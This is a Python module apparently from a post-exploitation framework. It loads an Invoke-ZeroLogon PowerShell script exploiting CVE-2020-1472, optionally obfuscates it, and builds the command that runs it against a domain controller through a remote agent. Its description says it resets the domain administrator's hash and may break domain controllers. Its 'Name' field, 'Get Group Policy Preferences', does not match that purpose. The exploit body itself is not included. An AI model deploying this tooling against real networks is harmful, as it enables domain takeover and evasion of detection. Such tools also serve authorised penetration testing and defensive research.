from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Get Group Policy Preferences',

            'Author': ['@hubbl3', '@Cx01N'],

            'Description': 'CVE-2020-1472 or ZeroLogon exploits a flaw in the Netlogon protocol to allow anyone '
                           'on the network to reset the domain administrator''s hash and elevate their privileges. '
                           'This will change the password of the domain controller account and may break communication '
                           'with other domain controllers. So, be careful!',

            'Software': '',

            'Techniques': ['T1548'],

            'Background': False,

            'OutputExtension': "",

            'NeedsAdmin': False,

            'OpsecSafe': False,

            'Language': 'powershell',

            'MinLanguageVersion': '5',

            'Comments': ['https://github.com/BC-SECURITY/Invoke-ZeroLogon']
        }

        self.options = {
            'Agent': {
                'Description': 'Agent to run on.',
                'Required': True,
                'Value': ''
            },
            'fqdn': {
                'Description': 'Fully Qualified Domain Name',
                'Required': True,
                'Value': ''
            },
            'Reset': {
                'Description': 'Reset target computer''s password to the default NTLM hash',
                'Required': False,
                'Value': 'False'
            }
        }
        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-ZeroLogon.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = "Invoke-ZeroLogon"

        for option, values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])

        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath,
                                          obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        script = helpers.keyword_obfuscation(script)

        return script
